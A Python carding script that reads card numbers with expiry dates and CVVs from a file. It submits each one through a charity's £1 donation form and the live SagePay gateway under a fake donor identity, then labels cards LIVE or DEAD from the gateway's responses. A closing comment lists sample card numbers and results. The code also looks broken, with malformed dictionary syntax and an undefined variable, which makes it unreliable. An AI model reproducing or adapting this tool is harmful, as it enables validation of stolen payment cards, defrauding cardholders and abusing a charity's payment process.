from bs4 import BeautifulSoup
from colorama import Fore, init
import smtplib
import requests
import time


init()


class Checker():
    def __init__(self):
        self.range = []
        
        print("""
        {re}             {g}________________________{re}
        {re}------------{g}|- {r}SAGEPAY GATEWAY -{g}|{re}------------
        {re}             {g}________________________{re}
        """.format(g=Fore.GREEN, r=Fore.RED, re=Fore.RESET))
        
        print("\t            " + Fore.GREEN + "[CHOOSE CC TYPE]")
        print(Fore.YELLOW + "-----------------------------------------------------")
        print("{}[1] {}Visa\t{}[2] {}Visa Debit\t{}[3] {}MasterCard\t{}[4] {}MC Debit".format(Fore.RED, Fore.RESET,Fore.RED, Fore.RESET,Fore.RED, Fore.RESET,Fore.RED, Fore.RESET))
        print(Fore.YELLOW + "-----------------------------------------------------\n" + Fore.RESET)

        cctype = input(Fore.BLUE + "[?] CCType > " + Fore.RESET)
        if cctype == '1':
            self.cc = "VISA"
        elif cctype == '2':
            self.cc = "DELTA"
        elif cctype == "3":
            self.cc = 'MC'
        elif cctype == '4':
            self.cc = "MCDEBIT"
        else:
            print(Fore.RED + "[-] " + Fore.RESET + "Credit Card Type must be included")
            return
        
        self.proxy_https = {"https": ""}
        with open('cc.txt', 'r') as ccs:
            for x in ccs.read().split('\n'):
                self.range.append(x)
        print(Fore.YELLOW + "[*] " + Fore.RESET + 'Checking ' + str(len(self.range)) + ' Credit Cards.')
        input(Fore.RESET + "PRESS ANY KEY TO CONTINUE")
        print(Fore.BLUE + "Start Checking at " + str(time.ctime()))
        print(Fore.RESET)
        self.checker()

    def check_on_sage(self, credit_card, ccentry):
        ccentry = str(ccentry)
        ccNum, ccMonth, ccYear, ccCode = credit_card.split('|')
        session = requests.Session()
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36'}


        mainSource = BeautifulSoup(session.get('https://www.refuge.org.uk/donate/single-donation/', headers=headers).text, 'html.parser')

        state_6 = mainSource.find('input', {'name': 'state_6'})['value']

        FirstData = {
            'input_13: Other Amount|0,
            'input_14: '£ 1.00',
            'input_4: 'Donation',
            'input_5: 'George',
            'input_6: 'Smith',
            'input_7: 'Quezon, Riverside',
            'input_15: '',
            'input_8: 'Makati city',
            'input_16: '',
            'input_17: '1216',
            'input_11: 'Philippines',
            'input_18: 'bloodhubv1@gmail.com',
            'input_19: '2536452165',
            'input_20: '09661554748',
            'input_21: 'I help',
            'input_27: 'Email',
            'input_23: 'Yes, I would like to Gift Aid any donations I make to Refuge (Registered Charity No. 277424) from today and during the four years prior to this date.<br><br>I am a UK tax payer and understand if I pay less Income Tax and/or Capital Gains Tax than the amount of Gift Aid claimed on all my donations in that year, it is my responsibility to pay any difference. Gift Aid is reclaimed by Refuge from the tax you pay for the current year. Please notify Refuge if you would like to cancel this declaration, change your home address or no longer pay sufficient income tax and/or capital gains tax.',
            'input_29.1: 'Yes, I am happy to receive emails from Refuge.',
            'input_32: '',
            'is_submit_1: '1',
            'gform_submit: '1',
            'gform_unique_id: '',
            'state_1: 'WyJ7XCIxM1wiOltcIjdjYWM2ZmU4NTBjY2M1NTE0OWJhOGVhNGRiN2Y5ZjQ1XCIsXCIyZWRkMzQ5ZjQ4ZGI5ZDZjOGM1ZmUyNTk2OWI3YjhjZFwiLFwiZWYwMmE2YWUzNGEyMmMwNzEwMGRhNDYzOWRkMTExYjRcIixcIjgyNzQyNGNhNzRkZDdmNDIwMGU2OTYwYjM4MjI5ZjlmXCIsXCJjYmMyMDdlOGI1ZjQ2Y2YxNGQ3ZGFhOWMxZGI2NTNjN1wiLFwiOTg5Mjg1MDFkY2ZmNWNmNDk0OGU0YjE5MDViMjQxMWNcIl19IiwiYjI0NmE4YzgyYWFhZWQwZGRjMTY0ZTQyZTU0MjVlMDgiXQ==',
            'gform_target_page_number_1: '0',
            'gform_source_page_number_1: '1',
            'gform_field_values: '',
        }


        #persrespans = BeautifulSoup(session.post('https://www.rowanshospice.co.uk/donate/make-a-donation/', data=persdeyta, headers=headers).text, 'html.parser')
        
        #lastdeyta = {
        #    'VPSProtocol': '3.00',
        #    'TxType': 'PAYMENT',
        #    'Vendor': 'rowanshospice',
        #    'Crypt': persrespans.find('input', {'name': 'Crypt'})['value']
        #}

        #he = {
        #    "cache-control": "no-store, no-cache, must-revalidate, post-check=0, pre-check=0",
        #    "content-language": "en-US",
        #    "content-type": "application/x-www-form-urlencoded"
        #}
        last = session.post('https://live.sagepay.com/gateway/service/vspform-register.vsp', data=lastdeyta, headers=headers)
        ################# SAGE PAY ###################

        fourthSource = session.post("https://live.sagepay.com/gateway/service/cardselection", data={'action': 'proceed', 'cardselected': self.cc}, headers=headers)

        sixthData = {
            'cardholder': "George Smith",
            'cardnumber': ccNum,
            'expirymonth': ccMonth,
            'expiryyear': ccYear,
            'securitycode': ccCode,
            'action': 'proceed',
        }
        sixthSource = session.post("https://live.sagepay.com/gateway/service/carddetails", data=sixthData, headers=headers)
        seventhSource = session.get("https://live.sagepay.com/gateway/service/cardconfirmation", headers=headers).text
        eightSource = session.post("https://live.sagepay.com/gateway/service/cardconfirmation", data={'action': 'proceed'}, headers=headers)
        Final = BeautifulSoup(session.get("https://live.sagepay.com/gateway/service/authentication", headers=headers).text, 'html.parser')


        try:
            if "insufficient" in Final.find('div', {'class': "notification"}).get_text().replace('\n', '').replace('\t', ''):
                print(Fore.GREEN + '[' + ccentry + '] ' + "LIVE   ---   " + credit_card)

            print(Fore.RED + '[' + ccentry + '] ' + "DEAD   ---   " + credit_card + '\tREASON: ' + Final.find('div', {'class': "notification"}).get_text().replace('\n', '').replace('\t', ''))
        except Exception as e:

            print(Fore.GREEN + '[' + ccentry + '] ' + "LIVE   ---   " + credit_card + '\tNote: Not Sure')


    def checker(self):
        f = open('cc.txt', 'r')
        cc = 0
        for x in f.read().split('\n'):
            cc += 1
            self.check_on_sage(x, cc)



"""
[693] 5210690278620433|06|2027|787      ----            The Authorisation has been rejected by the Vendor due to insufficient authentication. Please try a different card. 

[1]LIVE ----    4355440407061317|04|2023|632 => Your card's security code is incorrect.
[2] DEAD        ----    4355440407061572|04|2023|374 => Your card was declined.
[3]LIVE ----    4355440407060244|04|2023|292 => Your card's security code is incorrect.
[4] DEAD        ----    4355440407065326|04|2023|235 => Your card was declined.

"""

Checker()
